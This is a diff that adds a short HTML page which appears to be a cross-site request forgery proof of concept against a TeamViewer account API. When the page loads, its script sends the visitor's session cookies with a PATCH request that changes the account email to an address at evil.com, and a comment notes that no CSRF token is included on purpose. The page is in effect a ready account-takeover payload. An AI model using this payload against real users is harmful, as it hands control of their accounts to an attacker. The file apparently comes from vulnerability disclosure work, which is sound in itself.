@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch("https://web.teamviewer.com/api/account/v1/profile", {
+  method: "PATCH",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json",
+    "Accept": "application/json"
+    // No CSRF token included intentionally
+  },
+  body: JSON.stringify({
+    emailAddress: "mohamedmehanny5@evil.com"
+  })
+})
+.then(res => res.json())
+.then(data => console.log(data))
+.catch(err => console.log(err));
+</script>
+</body>
+</html>
